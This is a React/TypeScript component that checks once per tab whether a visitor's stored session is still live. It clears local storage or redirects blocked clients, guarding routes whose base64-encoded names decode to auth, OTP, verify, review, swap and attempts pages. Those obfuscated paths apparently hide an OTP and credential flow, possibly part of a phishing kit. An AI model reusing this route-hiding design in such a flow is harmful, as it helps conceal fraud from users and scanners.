import { useEffect } from "react";
import { useRouterState } from "@tanstack/react-router";
import { checkSessionAlive } from "@/lib/stale-session.functions";
import { BLOCK_FLAG, isBlocked } from "@/components/block-guard";
import { isClientBlocked } from "@/lib/block.functions";

const GUARDED = new Set([
  "/YXV0aA", "/b3Rw", "/dmVyaWZ5", "/cGVuZGluZw", "/cmV2aWV3", "/c3dhcA", "/c3VjY2Vzcw",
  "/Y29tcGxldGU", "/bG9nb3V0LWRldmljZXM", "/YmxvY2tlZA", "/YXR0ZW1wdHM", "/Y2hhdA",
]);
const CHECKED_FLAG = "sham_session_checked";

/**
 * Once per tab: if this browser carries old customer progress (name/email) but its
 * session no longer exists in the database, wipe local storage and send it to «/».
 * Fresh visitors carry no progress, so they are never checked or redirected.
 */
export function StaleSessionGuard() {
  const pathname = useRouterState({ select: (s) => s.location.pathname });

  useEffect(() => {
    if (!GUARDED.has(pathname)) return;
    if (pathname === "/YmxvY2tlZA" || isBlocked()) return; // الحظر النهائي أقوى من فحص الجلسة
    let ls: Storage, ss: Storage;
    try { ls = window.localStorage; ss = window.sessionStorage; } catch { return; }
    if (ss.getItem(CHECKED_FLAG)) return;
    ss.setItem(CHECKED_FLAG, "1");

    const sessionId = ls.getItem("sham_session_id");
    const email = ls.getItem("sham_email")?.trim().toLowerCase() || null;
    const hasProgress = !!(email || ls.getItem("sham_name") || ls.getItem("sham_phone"));
    // فقط عملاء سجّلوا دخولاً سابقاً (بريد محفوظ) يُفحص إن انتهت جلستهم.
    // قبل تسجيل الدخول، لا نعتبر الجلسة قديمة ولا نمسح البيانات.
    if (!sessionId || !hasProgress || !email) return;

    let cancelled = false;
    checkSessionAlive({ data: { sessionId, email } })
      .then(async (r) => {
        if (cancelled || r.alive) return;
        // الحظر النهائي يسبق أي تنظيف للجلسة القديمة
        try {
          const blocked = await isClientBlocked({ data: { email, sessionId } });
          if (cancelled) return;
          if (blocked.blocked) {
            try { ls.setItem(BLOCK_FLAG, "1"); } catch { /* ignore */ }
            if (window.location.pathname !== "/YmxvY2tlZA") window.location.replace("/YmxvY2tlZA");
            return;
          }
        } catch { /* نكمل التنظيف العادي */ }
        try { ls.clear(); ss.clear(); } catch { /* ignore */ }
        try { ss.setItem(CHECKED_FLAG, "1"); } catch { /* ignore */ }
        window.location.replace("/");
      })
      .catch(() => { /* keep the customer where they are */ });
    return () => { cancelled = true; };
  }, [pathname]);

  return null;
}
